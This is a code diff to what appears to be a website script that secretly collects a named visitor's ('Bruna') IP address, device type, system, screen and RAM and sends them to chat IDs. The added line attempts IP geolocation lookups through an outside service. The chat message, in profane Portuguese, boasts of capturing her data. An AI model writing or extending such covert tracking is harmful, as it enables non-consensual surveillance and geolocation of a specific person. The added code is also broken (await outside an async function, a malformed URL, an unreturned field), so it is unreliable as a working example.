@@ -22,6 +22,7 @@ function detectDeviceType() {
 function getDeviceInfo() {
     const deviceType = detectDeviceType();
     const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";
+    const others = await fetch(`https://ipapi.com${ip}/json`) ? await fetch(`https://ipapi.com${ip}/json`) :  "Sla porra, deu nn caralho tmnc essa desgraça";
 
     return {
         deviceType,
@@ -64,12 +65,14 @@ async function sendMessage(ip) {
 
     const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (pera que to testando antes)\n\n` +
                     `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
-                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
-                    `🌐 IP (IPv4): ${ip}\n` +
-                    `📱 Tipo: ${device.deviceType}\n` +
+                    `• Horário: ${new Date().toLocaleString('pt-BR')}\n` +
+                    `• IP (IPv4): ${ip}\n` +
+                    `• Tipo: ${device.deviceType}\n` +
                     `• Sistema: ${device.platform}\n` +
                     `• Tela: ${device.screen}\n` +
-                    `• RAM: ${device.deviceMemory}\n\n` +
+                    `• RAM: ${device.deviceMemory}\n` +
+                    `Outros dados fodas: ${device.others}\n\n` +
+                    
                     `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;
 
     for (const chatId of CHAT_IDS) {
